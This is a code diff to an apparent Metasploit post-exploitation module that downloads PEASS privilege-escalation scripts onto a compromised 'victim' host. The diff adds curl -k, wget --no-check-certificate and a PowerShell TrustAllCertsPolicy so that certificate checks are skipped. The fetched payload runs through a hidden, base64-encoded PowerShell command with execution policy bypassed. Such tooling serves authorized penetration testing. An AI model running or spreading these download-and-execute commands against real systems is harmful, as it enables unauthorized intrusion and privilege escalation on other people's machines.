@@ -161,14 +161,16 @@ class MetasploitModule < Msf::Post
       
       # Configure the download of the scrip in Windows
       if session.platform.include?("win")
-        cmd = "$ProgressPreference = 'SilentlyContinue'; $#{ps_var1} = Invoke-WebRequest \"#{url_download_peass}\" -UseBasicParsing | Select-Object -ExpandProperty Content;"
+        cmd = "$ProgressPreference = 'SilentlyContinue';"
+        cmd += get_bypass_tls_cert()
+        cmd += "$#{ps_var1} = Invoke-WebRequest \"#{url_download_peass}\" -UseBasicParsing | Select-Object -ExpandProperty Content;"
       
       # Configure the download of the scrip in unix
       else
-        cmd = "curl -s \"#{url_download_peass}\""
+        cmd = "curl -k -s \"#{url_download_peass}\""
         curl_path = cmd_exec("command -v curl")
         if ! curl_path.include?("curl")
-          cmd = "wget -q -O - \"#{url_download_peass}\""
+          cmd = "wget --no-check-certificate -q -O - \"#{url_download_peass}\""
           wget_path = cmd_exec("command -v wget")
           raise 'Neither curl nor wget were found in victim, unset the SRVHOST option!' unless wget_path.include?("wget")
         end
@@ -188,6 +190,7 @@ class MetasploitModule < Msf::Post
         # Transform to Base64 in UTF-16LE format
         cmd_utf16le = cmd.encode("utf-16le")
         cmd_utf16le_b64 = Base64.encode64(cmd_utf16le).gsub(/\r?\n/, "")
+        
         tmpout << cmd_exec("powershell.exe", args="-ep bypass -WindowStyle hidden -nop -enc #{cmd_utf16le_b64}", time_out=datastore["TIMEOUT"])
       
         # If unix, then, suppose linpeas was loaded
@@ -261,9 +264,28 @@ class MetasploitModule < Msf::Post
     }
   end
 
+  def get_bypass_tls_cert
+    return'
+    # Code to accept any certificate in the https connection from https://stackoverflow.com/questions/11696944/powershell-v3-invoke-webrequest-https-error
+    add-type @"
+    using System.Net;
+    using System.Security.Cryptography.X509Certificates;
+    public class TrustAllCertsPolicy : ICertificatePolicy {
+        public bool CheckValidationResult(
+            ServicePoint srvPoint, X509Certificate certificate,
+            WebRequest request, int certificateProblem) {
+            return true;
+        }
+    }
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;
+'
+  end
+
   def get_ps_aes_decr
     # PS code to decrypt Winpeas
-    return '# Taken from https://gist.github.com/Darryl-G/d1039c2407262cb6d735c3e7a730ee86
+    return '
+    # Taken from https://gist.github.com/Darryl-G/d1039c2407262cb6d735c3e7a730ee86
 function DecryptStringFromBytesAes([String] $key, [String] $iv, [String] $encrypted) {
     [byte[]] $encrypted = [Convert]::FromBase64String($encrypted);
     [byte[]] $key = [Convert]::FromBase64String($key)
